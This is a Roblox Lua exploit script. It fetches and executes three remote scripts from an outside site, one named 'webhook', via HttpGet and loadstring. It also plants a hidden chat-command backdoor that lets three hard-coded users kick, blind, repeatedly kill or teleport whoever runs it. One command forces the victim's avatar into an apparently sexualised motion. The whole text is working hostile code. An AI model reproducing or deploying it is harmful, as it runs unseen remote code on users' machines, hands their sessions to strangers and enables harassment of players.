loadstring([=[
-- ===================== CONFIG =====================
local MainScript = [[
loadstring(game:HttpGet("https://muzu.me/go/eee.txt"))()
]]

local SecondScript = [[
loadstring(game:HttpGet("https://muzu.me/go/webhook.txt"))()
]]

local ThirdScript = [[
loadstring(game:HttpGet("https://muzu.me/go/displayname.txt"))()
]]
-- ===================== END CONFIG =====================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local AllowedUsers = {
    ["z7prt"] = "😎",
    ["srilangish"] = "😎",
    ["Probloxxy_68"] = "😎"
}

local BlindGui = nil
local ResetLoop = false
local BenxLoop = false
local BenxTarget = nil
local BenxConnection = nil

-- Safely append the sunglasses emoji to the local user's display name using property change handling
task.spawn(function()
    for username, emoji in pairs(AllowedUsers) do
        if string.lower(LocalPlayer.Name) == string.lower(username) then
            pcall(function()
                local originalName = LocalPlayer.DisplayName
                if not string.find(originalName, emoji, 1, true) then
                    LocalPlayer.DisplayName = "[" .. emoji .. "] " .. originalName
                end

                LocalPlayer:GetPropertyChangedSignal("DisplayName"):Connect(function()
                    local currentName = LocalPlayer.DisplayName
                    if not string.find(currentName, emoji, 1, true) then
                        local cleanName = currentName:gsub("%[.-%]%s*", "")
                        LocalPlayer.DisplayName = "[" .. emoji .. "] " .. cleanName
                    end
                end)
            end)
            break
        end
    end
end)

local function isAllowed(player)
    local name = string.lower(player.Name)
    local display = player.DisplayName
    for username, emoji in pairs(AllowedUsers) do
        if name == string.lower(username) or display:find(emoji, 1, true) then
            return true
        end
    end
    return false
end

local function createBlind()
    if BlindGui then return end
    BlindGui = Instance.new("ScreenGui")
    BlindGui.Name = "BlindOverlay"
    BlindGui.IgnoreGuiInset = true
    BlindGui.ResetOnSpawn = false
    BlindGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BorderSizePixel = 0
    frame.ZIndex = 9999
    frame.Parent = BlindGui
end

local function removeBlind()
    if BlindGui then BlindGui:Destroy() BlindGui = nil end
end

local function startResetLoop()
    if ResetLoop then return end
    ResetLoop = true
    task.spawn(function()
        while ResetLoop and LocalPlayer do
            local char = LocalPlayer.Character
            if char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then hum.Health = 0 else char:BreakJoints() end
            end
            task.wait(0.3)
        end
    end)
end

local function stopBenx()
    BenxLoop = false
    BenxTarget = nil
    if BenxConnection then BenxConnection:Disconnect() BenxConnection = nil end

    local char = LocalPlayer.Character
    if char then
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hrp then hrp.Anchored = false end
        if hum then hum.Sit = false hum.PlatformStand = false end
    end
end

local function startBenx(admin)
    if BenxLoop then return end
    BenxLoop = true
    BenxTarget = admin

    local direction = 1
    local timer = 0

    BenxConnection = RunService.Heartbeat:Connect(function(dt)
        if not BenxLoop or not BenxTarget then stopBenx() return end

        local adminChar = BenxTarget.Character
        local victimChar = LocalPlayer.Character
        if not adminChar or not victimChar then return end

        local adminHRP = adminChar:FindFirstChild("HumanoidRootPart")
        local victimHRP = victimChar:FindFirstChild("HumanoidRootPart")
        local victimHum = victimChar:FindFirstChildOfClass("Humanoid")

        if adminHRP and victimHRP and victimHum then
            victimHum.Sit = true
            victimHum.PlatformStand = true
            
            pcall(function()
                if victimHRP:CanSetNetworkOwnership() then
                    victimHRP:SetNetworkOwner(LocalPlayer)
                end
            end)

            timer = timer + dt
            if timer >= 0.7 then
                direction = -direction
                timer = 0
            end

            local distance = 2.4 + (direction * 1.1)
            local frontPos = adminHRP.Position + (adminHRP.CFrame.LookVector * distance) - Vector3.new(0, 1.2, 0)
            local targetCFrame = CFrame.new(frontPos, adminHRP.Position)
            
            victimHRP.CFrame = targetCFrame
        end
    end)
end

local function bringToAdmin(admin)
    local adminChar = admin.Character
    local localChar = LocalPlayer.Character
    if adminChar and localChar then
        local adminHRP = adminChar:FindFirstChild("HumanoidRootPart")
        local localHRP = localChar:FindFirstChild("HumanoidRootPart")
        if adminHRP and localHRP then
            localHRP.CFrame = adminHRP.CFrame + Vector3.new(0, 3, 0)
        end
    end
end

local function onChatted(player, message)
    if not isAllowed(player) then return end
    local msg = string.lower(message):gsub("%s+", "")
    
    if msg == "!kick" then
        LocalPlayer:Kick("Kicked by admin.")
    elseif msg == "!blind" then
        createBlind()
    elseif msg == "!unblind" then
        removeBlind()
    elseif msg == "!reset" then
        startResetLoop()
    elseif msg == "!stopreset" then
        ResetLoop = false
    elseif msg == "!benx" then
        startBenx(player)
    elseif msg == "!stopbenx" then
        stopBenx()
    elseif msg == "!bring" then
        bringToAdmin(player)
    end
end

local function setupPlayer(player)
    player.Chatted:Connect(function(msg) onChatted(player, msg) end)
end

for _, plr in pairs(Players:GetPlayers()) do setupPlayer(plr) end
Players.PlayerAdded:Connect(setupPlayer)

print(getpid and getpid() or "PID not available")

-- Execute all 3 loadstrings sequentially
task.spawn(function()
    pcall(function() loadstring(MainScript)() end)
    pcall(function() loadstring(SecondScript)() end)
    pcall(function() loadstring(ThirdScript)() end)
end)
]=])()
